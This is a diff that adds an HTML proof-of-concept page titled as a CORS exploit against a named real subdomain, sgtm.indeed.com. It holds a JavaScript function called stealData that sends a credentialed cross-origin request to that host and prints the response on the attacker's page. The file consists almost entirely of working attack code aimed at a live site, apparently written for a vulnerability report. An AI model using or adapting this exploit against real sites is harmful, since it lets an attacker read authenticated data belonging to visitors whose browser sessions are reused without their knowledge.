@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Exploit PoC — sgtm.indeed.com</title>
+</head>
+<body>
+  <h2>CORS Exploit PoC — sgtm.indeed.com</h2>
+  <button id="runBtn">Run PoC</button>
+
+  <pre id="output">Waiting...</pre>
+
+  <!-- Define your script AFTER the HTML elements -->
+  <script>
+    function stealData() {
+      fetch("https://sgtm.indeed.com/g/collect?v=2&tid=G-LYNT3BTHPG", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(response => {
+        document.getElementById("output").innerText = `Status: ${response.status}`;
+        return response.text();
+      })
+      .then(text => {
+        document.getElementById("output").innerText += `\n\nResponse:\n${text}`;
+        console.log("Response:", text);
+      })
+      .catch(err => {
+        document.getElementById("output").innerText = "Fetch failed: " + err;
+        console.error("Error:", err);
+      });
+    }
+
+    // Attach event listener after DOM is loaded
+    document.getElementById("runBtn").addEventListener("click", stealData);
+  </script>
+</body>
+</html>
